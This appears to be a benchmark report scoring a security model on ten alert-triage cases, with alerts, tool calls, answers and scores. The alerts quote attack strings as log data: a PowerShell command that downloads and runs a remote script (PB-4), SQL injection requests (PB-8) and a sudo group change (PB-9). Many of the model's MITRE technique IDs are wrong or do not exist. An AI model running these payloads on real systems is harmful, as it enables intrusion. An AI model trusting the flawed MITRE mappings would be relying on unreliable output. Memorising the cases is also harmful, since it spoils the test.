# Playbook benchmark — `hf.co/koesn/ZySec-7B-v1-GGUF:Q4_K_M`

Model: `hf.co/koesn/ZySec-7B-v1-GGUF:Q4_K_M`  
Mode: **harness-executed**  
Run started: 2026-05-06 03:25:16  
Cases: 10  
Format failures: 0  

## Summary

| Metric | Score |
|---|---|
| Composite context-understanding score | **68%** |
| Verdict accuracy | 9/10 (90%) |
| Severity accuracy | 9/10 (90%) |
| MITRE accuracy | 2/10 (20%) |
| Tool-selection accuracy | 7/10 (70%) |
| Format failures | 0/10 |
| Forbidden tool calls (e.g. auto-isolate on benign) | 0 |
| Not-found tool responses (hallucinated entities) | 1 |
| p50 latency | 1.7 s |
| p95 latency | 2.2 s |

## Per-case results

| Case | Expected | Verdict | Severity | MITRE | Tools | Latency |
|---|---|---|---|---|---|---|
| PB-1 | beni | PASS | PASS | PASS | PASS | 4.5s |
| PB-2 | inci | PASS | PASS | FAIL | PASS | 1.9s |
| PB-3 | inci | PASS | PASS | FAIL | PASS | 1.7s |
| PB-4 | inci | PASS | PASS | FAIL | PASS | 2.2s |
| PB-5 | inci | PASS | PASS | FAIL | FAIL | 1.7s |
| PB-6 | inci | PASS | PASS | FAIL | PASS | 1.8s |
| PB-7 | beni | PASS | PASS | PASS | PASS | 1.6s |
| PB-8 | inci | PASS | PASS | FAIL | PASS | 1.7s |
| PB-9 | inci | PASS | PASS | FAIL | FAIL | 1.4s |
| PB-10 | inci | FAIL | FAIL | FAIL | FAIL | 1.5s |

## Per-case detail

### PB-1 — expected: **benign** (severity ['info', 'low'], MITRE n/a)

_Alert_: Single-event alert: user `alice` (laptop 10.0.4.22) authenticated to the corporate intranet at 09:02 local time on a workday and opened her email. No prior failed attempts. Source matches her usual IP range.

_Latency_: 4.46s · GPU 93%/18149MB · CPU 7% · RAM 33058MB

_Tool calls_:
```
- cmdb.get_asset({"host_or_ip": "10.0.4.22"}) -> {"query": "10.0.4.22", "found": true, "hostname": "alice-laptop", "criticality": "low", "owner": "alice", "business_unit": "marketing", "os": "macOS 14", "tags"
```

_Parsed answer_:
```json
{
  "verdict": "benign",
  "severity": "low",
  "mitre": [],
  "tools_used": [
    "cmdb.get_asset"
  ],
  "rationale": "User alice (laptop 10.0.4.22) authenticated normally to the corporate intranet at 09:02 local time on a workday and opened her email. Criticality is low, owner and business unit match expected values, and tag 'vpn-allowed' indicates remote access is allowed."
}
```

_Scoring_: verdict=PASS severity=PASS mitre=PASS tools=PASS (matched: ['cmdb.get_asset'])

### PB-2 — expected: **incident** (severity ['high', 'critical'], MITRE ['T1078', 'T1078.002', 'T1021', 'T1021.001'])

_Alert_: Domain admin account `dom_admin_01` authenticated successfully from external IP 41.78.122.18 at 03:14 UTC. Within 4 minutes the same account opened 18 RDP sessions to internal hosts (DC01, FILER-02, FINANCE-DB, ENG-FILE, BACKUP-01, …).

_Latency_: 1.92s · GPU 93%/17737MB · CPU 9% · RAM 33025MB

_Tool calls_:
```
- threat_intel.lookup_ip({"ip": "41.78.122.18"}) -> {"ip": "41.78.122.18", "verdict": "malicious", "score": 92, "geo": "NG", "tags": ["c2", "rdp-bruteforce"], "first_seen": "2026-04-22", "notes": "Recent C2 sight
- cmdb.get_asset({"host_or_ip": ["DC01", "FILER-02", "FINANCE-DB", "ENG-FILE", "BACKUP-01"]}) -> {"error": "ModelRetry: Error executing tool get_asset: 1 validation error for get_assetArguments
host_or_ip
  Input should be a valid string [type=string_type, 
```

_Parsed answer_:
```json
{
  "verdict": "incident",
  "severity": "high",
  "mitre": [
    "T1105",
    "T1130"
  ],
  "tools_used": [
    "threat_intel.lookup_ip",
    "cmdb.get_asset"
  ],
  "rationale": "IP 41.78.122.18 has a recent malicious verdict with C2 and RDP-bruteforce tags; internal hosts DC01, FILER-02, FINANCE-DB, ENG-FILE, BACKUP-01 are involved in the incident."
}
```

_Scoring_: verdict=PASS severity=PASS mitre=FAIL tools=PASS (matched: ['threat_intel.lookup_ip', 'cmdb.get_asset'])

### PB-3 — expected: **incident** (severity ['high', 'critical'], MITRE ['T1110', 'T1110.001', 'T1110.003', 'T1110.004'])

_Alert_: Web server `webhost` (10.0.4.10): 50,000 POST requests to /wp-login.php from 1,200 distinct IPs within 10 minutes, including 3 successful logins to admin accounts. Sample source IP: 89.248.165.74.

_Latency_: 1.71s · GPU 93%/17737MB · CPU 14% · RAM 33068MB

_Tool calls_:
```
- threat_intel.lookup_ip({"ip": "89.248.165.74"}) -> {"ip": "89.248.165.74", "verdict": "malicious", "score": 88, "geo": "NL", "tags": ["botnet", "wp-bruteforce"], "first_seen": "2026-03-11", "notes": "Known WordP
- cmdb.get_asset({"host_or_ip": "webhost"}) -> {"query": "webhost", "found": true, "hostname": "webhost", "criticality": "high", "owner": "infra-team", "business_unit": "platform", "os": "Ubuntu 22.04", "tag
```

_Parsed answer_:
```json
{
  "verdict": "incident",
  "severity": "high",
  "mitre": [
    "T1100.002",
    "T1566.003"
  ],
  "tools_used": [
    "threat_intel.lookup_ip",
    "cmdb.get_asset"
  ],
  "rationale": "IP 89.248.165.74 has a malicious verdict ('botnet' and 'wp-bruteforce') from threat intel; webhost (criticality high) is a public-facing WordPress site."
}
```

_Scoring_: verdict=PASS severity=PASS mitre=FAIL tools=PASS (matched: ['threat_intel.lookup_ip', 'cmdb.get_asset'])

### PB-4 — expected: **incident** (severity ['high', 'critical'], MITRE ['T1059.001', 'T1059', 'T1566.001', 'T1204', 'T1204.002'])

_Alert_: EDR alert on host WIN-DEV-04: `winword.exe` spawned `powershell.exe` which executed `IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.15/a.ps1')`. User: dave.

_Latency_: 2.21s · GPU 93%/17737MB · CPU 16% · RAM 33050MB

_Tool calls_:
```
- threat_intel.lookup_ip({"ip": "185.220.101.15"}) -> {"ip": "185.220.101.15", "verdict": "malicious", "score": 95, "geo": "DE", "tags": ["tor-exit", "malware-c2"], "first_seen": "2025-11-29", "notes": "Tor exit no
- cmdb.get_asset({"host_or_ip": "WIN-DEV-04"}) -> {"query": "WIN-DEV-04", "found": true, "hostname": "WIN-DEV-04", "criticality": "medium", "owner": "dave", "business_unit": "engineering", "os": "Windows 11", "
- edr.get_processes({"host": "WIN-DEV-04"}) -> {"host": "WIN-DEV-04", "found": true, "processes": [{"pid": 4112, "name": "winword.exe", "parent": "explorer.exe", "cmdline": "WINWORD.EXE /n \"C:\\Users\\dave\
```

_Parsed answer_:
```json
{
  "verdict": "incident",
  "severity": "high",
  "mitre": [
    "T1059.002",
    "T1078.002"
  ],
  "tools_used": [
    "threat_intel.lookup_ip",
    "cmdb.get_asset",
    "edr.get_processes"
  ],
  "rationale": "IP 185.220.101.15 has a malicious C2 verdict and is used in the Powershell command; host WIN-DEV-04 is associated with user dave, who initiated the Office document launching the attack chain."
}
```

_Scoring_: verdict=PASS severity=PASS mitre=FAIL tools=PASS (matched: ['edr.get_processes', 'threat_intel.lookup_ip'])

### PB-5 — expected: **incident** (severity ['high', 'critical'], MITRE ['T1071.004', 'T1071', 'T1048.003', 'T1048'])

_Alert_: DNS server logs show internal host 10.0.4.55 issuing 4,000+ unique subdomain queries against `cdn-update.xyz` over 2 hours, with TXT-record responses averaging 200 bytes.

_Latency_: 1.68s · GPU 93%/17737MB · CPU 23% · RAM 33078MB

_Tool calls_:
```
- threat_intel.lookup_ip({"ip": "cdn-update.xyz"}) -> {"ip": "cdn-update.xyz", "verdict": "unknown", "score": 0, "notes": "No record in threat-intel feed."}
- cmdb.get_asset({"host_or_ip": "10.0.4.55"}) -> {"query": "10.0.4.55", "found": true, "hostname": "ops-jumphost", "criticality": "high", "owner": "secops", "business_unit": "platform", "os": "Ubuntu 22.04", "
```

_Parsed answer_:
```json
{
  "verdict": "incident",
  "severity": "high",
  "mitre": [
    "T1046.002"
  ],
  "tools_used": [
    "cmdb.get_asset",
    "threat_intel.lookup_ip"
  ],
  "rationale": "Internal host ops-jumphost (criticality high, tag 'no-egress-allowed') made multiple queries to unknown IP cdn-update.xyz, resulting in large TXT responses. Threat intel feed does not have a record for cdn-update.xyz."
}
```

_Scoring_: verdict=PASS severity=PASS mitre=FAIL tools=FAIL not_found_calls=1

### PB-6 — expected: **incident** (severity ['high', 'critical'], MITRE ['T1110', 'T1110.001', 'T1078'])

_Alert_: sshd on host `webhost` (10.0.4.10) recorded 7 failed password attempts for distinct usernames (admin, root, oracle, postgres, git, test, ubuntu) from source IP 185.220.101.45 between 03:41:02 and 03:41:20, followed by a successful login as `ubuntu` from the same IP at 03:43:21.

_Latency_: 1.84s · GPU 94%/17739MB · CPU 18% · RAM 33071MB

_Tool calls_:
```
- threat_intel.lookup_ip({"ip": "185.220.101.45"}) -> {"ip": "185.220.101.45", "verdict": "malicious", "score": 95, "geo": "DE", "tags": ["tor-exit", "ssh-bruteforce"], "first_seen": "2025-12-04", "notes": "Tor exi
- cmdb.get_asset({"host_or_ip": "webhost"}) -> {"query": "webhost", "found": true, "hostname": "webhost", "criticality": "high", "owner": "infra-team", "business_unit": "platform", "os": "Ubuntu 22.04", "tag
```

_Parsed answer_:
```json
{
  "verdict": "incident",
  "severity": "high",
  "mitre": [
    "T1100: Brute Force"
  ],
  "tools_used": [
    "threat_intel.lookup_ip",
    "cmdb.get_asset"
  ],
  "rationale": "IP 185.220.101.45 has a malicious verdict ('tor-exit' and 'ssh-bruteforce') and was used in multiple failed SSH logins against webhost, which is a high-criticality public-facing host running WordPress. The successful login as 'ubuntu' from the same IP suggests a possible compromise."
}
```

_Scoring_: verdict=PASS severity=PASS mitre=FAIL tools=PASS (matched: ['threat_intel.lookup_ip', 'cmdb.get_asset'])

### PB-7 — expected: **benign** (severity ['info', 'low'], MITRE n/a)

_Alert_: Routine sshd event on `webhost` (10.0.4.10): publickey login accepted for `alice` from 10.0.4.22 at 09:14:32. PAM session opened. systemd-logind started session 2841.

_Latency_: 1.57s · GPU 94%/17739MB · CPU 16% · RAM 33027MB

_Tool calls_:
```
- cmdb.get_asset({"host_or_ip": "webhost"}) -> {"query": "webhost", "found": true, "hostname": "webhost", "criticality": "high", "owner": "infra-team", "business_unit": "platform", "os": "Ubuntu 22.04", "tag
- cmdb.get_asset({"host_or_ip": "10.0.4.22"}) -> {"query": "10.0.4.22", "found": true, "hostname": "alice-laptop", "criticality": "low", "owner": "alice", "business_unit": "marketing", "os": "macOS 14", "tags"
```

_Parsed answer_:
```json
{
  "verdict": "benign",
  "severity": "low",
  "mitre": [],
  "tools_used": [
    "cmdb.get_asset",
    "cmdb.get_asset"
  ],
  "rationale": "User alice (tagged 'endpoint' and 'vpn-allowed') logged in to webhost (tagged 'public-facing' and 'wordpress') via sshd. Criticality of alice-laptop is low, criticality of webhost is high."
}
```

_Scoring_: verdict=PASS severity=PASS mitre=PASS tools=PASS (matched: ['cmdb.get_asset'])

### PB-8 — expected: **incident** (severity ['high', 'critical'], MITRE ['T1190'])

_Alert_: Apache access log on `webhost` (10.0.4.10) shows 4 requests from 185.62.190.13 within 4 seconds: `GET /products.php?id=1' OR '1'='1--`, `GET /products.php?id=1+UNION+SELECT+username,password+FROM+users--`, `GET /products.php?id=1;DROP+TABLE+users--`, `GET /products.php?id=1+AND+SLEEP(5)--`. The UNION SELECT request returned a 200 with a 4129-byte body.

_Latency_: 1.67s · GPU 93%/17739MB · CPU 14% · RAM 33024MB

_Tool calls_:
```
- threat_intel.lookup_ip({"ip": "185.62.190.13"}) -> {"ip": "185.62.190.13", "verdict": "suspicious", "score": 78, "geo": "GB", "tags": ["sqlmap", "scanner"], "first_seen": "2026-04-30", "notes": "Recent sqlmap us
- cmdb.get_asset({"host_or_ip": "webhost"}) -> {"query": "webhost", "found": true, "hostname": "webhost", "criticality": "high", "owner": "infra-team", "business_unit": "platform", "os": "Ubuntu 22.04", "tag
```

_Parsed answer_:
```json
{
  "verdict": "incident",
  "severity": "high",
  "mitre": [
    "T1068.002",
    "T1567.003"
  ],
  "tools_used": [
    "threat_intel.lookup_ip",
    "cmdb.get_asset"
  ],
  "rationale": "IP 185.62.190.13 has a recent sqlmap user-agent and matches the source IP of SQL injection attempts against webhost, which is a high-criticality public-facing WordPress host."
}
```

_Scoring_: verdict=PASS severity=PASS mitre=FAIL tools=PASS (matched: ['threat_intel.lookup_ip', 'cmdb.get_asset'])

### PB-9 — expected: **incident** (severity ['medium', 'high'], MITRE ['T1098', 'T1548', 'T1136', 'T1078'])

_Alert_: On host `webhost` at 03:17:42, user `bob` (TTY pts/3) ran `sudo /usr/sbin/usermod -aG sudo svc_backup`. The change was applied (`add 'svc_backup' to group 'sudo'`). bob is a developer account with sudo rights but no documented need to modify service-account permissions at 03:17.

_Latency_: 1.38s · GPU 93%/17739MB · CPU 11% · RAM 32985MB

_Tool calls_:
```
- cmdb.get_asset({"host_or_ip": "webhost"}) -> {"query": "webhost", "found": true, "hostname": "webhost", "criticality": "high", "owner": "infra-team", "business_unit": "platform", "os": "Ubuntu 22.04", "tag
- cmdb.get_asset({"user": "bob"}) -> {"error": "ModelRetry: Error executing tool get_asset: 1 validation error for get_assetArguments
host_or_ip
  Field required [type=missing, input_value={'user':
```

_Parsed answer_:
```json
{
  "verdict": "incident",
  "severity": "high",
  "mitre": [
    "T1227.003"
  ],
  "tools_used": [
    "cmdb.get_asset",
    "cmdb.get_asset"
  ],
  "rationale": "User bob added service account svc_backup to the sudo group on public-facing webhost, which is unexpected and high criticality."
}
```

_Scoring_: verdict=PASS severity=PASS mitre=FAIL tools=FAIL

### PB-10 — expected: **incident** (severity ['high', 'critical'], MITRE ['T1110', 'T1110.001', 'T1110.003', 'T1078', 'T1078.002'])

_Alert_: Domain controller DC01: 5 sequential EventID 4625 (BadPassword) events for account `Administrator`, LogonType 3, source IP 192.168.50.13 (workstation KIOSK-04) between 02:18:14 and 02:18:24, followed by an EventID 4624 (success) for the same account from the same IP at 02:21:42.

_Latency_: 1.51s · GPU 93%/17739MB · CPU 12% · RAM 32979MB

_Tool calls_:
```
- threat_intel.lookup_ip({"ip": "192.168.50.13"}) -> {"ip": "192.168.50.13", "verdict": "benign", "score": 10, "geo": "internal", "tags": ["rfc1918", "kiosk-subnet"], "first_seen": null, "notes": "Internal kiosk s
- cmdb.get_asset.get_host({"hostname": "DC01"}) -> {"error": "unknown server 'cmdb.get_asset'"}
```

_Parsed answer_:
```json
{
  "verdict": "anomaly",
  "severity": "medium",
  "mitre": [
    "T1105",
    "T1106"
  ],
  "tools_used": [
    "threat_intel.lookup_ip"
  ],
  "rationale": "Internal IP 192.168.50.13 associated with kiosk subnet had multiple BadPassword events followed by a successful logon as Administrator."
}
```

_Scoring_: verdict=FAIL severity=FAIL mitre=FAIL tools=FAIL
